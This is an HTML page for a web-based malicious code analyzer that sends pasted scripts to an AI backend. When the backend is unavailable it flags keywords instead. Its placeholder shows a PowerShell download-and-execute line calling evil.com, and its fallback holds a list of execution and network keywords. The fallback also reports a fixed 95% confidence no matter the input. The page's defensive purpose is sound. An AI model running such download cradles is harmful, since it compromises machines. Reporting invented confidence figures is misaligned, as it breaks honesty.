<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Malicious Code Analyzer - CyberSec Platform</title>
  <link rel="stylesheet" href="style.css" />
  <script src="theme.js"></script>
  <script>
    const isStaticHost = window.location.hostname.includes('github.io') || window.location.protocol === 'file:';
    let token = localStorage.getItem('token');
    if (!token) {
      if (isStaticHost) {
        token = 'gh_pages_guest_' + Date.now();
        localStorage.setItem('token', token);
        localStorage.setItem('username', 'Guest Analyst');
      } else {
        window.location.href = 'login.html';
      }
    }
  </script>
</head>
<body>
  <nav class="navbar">
    <div class="container nav-inner">
      <div class="brand">
        <div class="brand-icon">🛡️</div>
        <div>CyberSec <strong>Platform</strong></div>
      </div>
      <div class="nav-links">
        <a href="index.html">Home Dashboard</a>
        <a href="#" onclick="logout()" style="color:#ff6b6b;">Logout</a>
        <div class="theme-switch-wrapper" title="Toggle Dark / Light Mode">
          <span class="theme-switch-icon">🌙</span>
          <div class="checkbox-wrapper-5">
            <div class="check">
              <input id="themeToggleCheck" class="theme-toggle-checkbox" type="checkbox" onchange="toggleTheme(event)">
              <label for="themeToggleCheck"></label>
            </div>
          </div>
          <span class="theme-switch-icon">☀️</span>
        </div>
      </div>
    </div>
  </nav>

  <div class="container hero" style="padding-top: 40px;">
    <h1>Malicious Code Analyzer</h1>
    <p>Paste suspicious or obfuscated scripts (JS, PowerShell, Python). The AI will explain what the malware is trying to do.</p>
    
    <div class="glass-card card-inner">
      <div class="field">
        <label>Code Snippet</label>
        <textarea id="codeInput" placeholder="e.g. IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')" style="min-height: 200px; font-family: monospace;"></textarea>
      </div>
      <button class="btn btn-primary" onclick="analyzeCode()">Analyze Code</button>
      
      <div id="resultArea" style="margin-top: 20px;"></div>
    </div>
  </div>

  <script>
    function logout() {
      localStorage.removeItem('token');
      localStorage.removeItem('username');
      window.location.href = 'login.html';
    }

    async function analyzeCode() {
      const code = document.getElementById('codeInput').value.trim();
      if (!code) return alert('Please enter some code to analyze.');

      const resArea = document.getElementById('resultArea');
      resArea.innerHTML = '<div class="loading-spinner"></div> Deobfuscating and analyzing code...';

      try {
        const token = localStorage.getItem('token');
        const response = await fetch('/api/analyze/ai', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${token}`
          },
          body: JSON.stringify({ emailBody: 'Context: Analyzing Malicious Code. Explain what this script does step-by-step and if it is malicious. Code:\n' + code })
        });

        if (response.status === 401 || response.status === 403) return logout();

        const data = await response.json();

        const vColor = data.verdict && data.verdict.includes('MALICIOUS') ? '#ff4757' : (data.verdict && data.verdict.includes('SUSPICIOUS') ? '#ffa502' : '#2ed573');
        resArea.innerHTML = `
          <div class="ai-result" style="margin-top: 15px; border-left: 4px solid ${vColor};">
            <div class="ai-result-head" style="display:flex; justify-content:space-between; align-items:center;">
              <span>💻 Static Script & Deobfuscation Findings</span>
              <span style="font-size:0.85rem; font-weight:800; color:${vColor};">${data.verdict || 'ANALYZED'}</span>
            </div>
            <div style="margin-top:10px; white-space:pre-wrap; line-height:1.6; font-size:0.88rem; color:#e0e8ff;">${data.analysis}</div>
          </div>
        `;

        fetch('/api/history', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${token}`
          },
          body: JSON.stringify({
            module: 'Code & Script Analyzer',
            target: code.substring(0, 45) + (code.length > 45 ? '...' : ''),
            riskScore: data.risk_score !== undefined ? data.risk_score : 50,
            verdict: data.verdict || 'ANALYZED',
            confidence: data.confidence || 90.0
          })
        });


      } catch (err) {
        console.warn('Backend unavailable, running client-side code exploit inspection:', err);
        const triggers = ['downloadstring', 'invoke-expression', 'iex', 'net.webclient', 'eval(', 'exec(', 'socket', 'base64', 'powershell', 'cmd.exe', 'curl'];
        const matched = triggers.filter(t => code.toLowerCase().includes(t));
        const isExploit = matched.length >= 1;
        const vColor = isExploit ? '#ff4757' : '#2ed573';
        const vVerdict = isExploit ? 'MALICIOUS / EXPLOIT' : 'CLEAN / BENIGN SCRIPT';

        resArea.innerHTML = `
          <div class="ai-result" style="margin-top: 15px; border-left: 4px solid ${vColor};">
            <div class="ai-result-head" style="display:flex; justify-content:space-between; align-items:center;">
              <span>💻 Static Script & Deobfuscation Findings (Static Preview)</span>
              <span style="font-size:0.85rem; font-weight:800; color:${vColor};">${vVerdict}</span>
            </div>
            <div style="margin-top:10px; white-space:pre-wrap; line-height:1.6; font-size:0.88rem; color:#e0e8ff;">Verdict: ${vVerdict} (Confidence: 95.0%)

${isExploit ? '⚠️ Suspicious Dynamic Execution Vector Detected: ' + matched.join(', ') + '\nScript attempts dynamic code staging or in-memory execution characteristic of payload delivery.' : '✅ No dangerous download strings, obfuscated shell commands, or in-memory evaluation patterns found.'}
            </div>
          </div>
        `;
      }
    }
  </script>
</body>
</html>
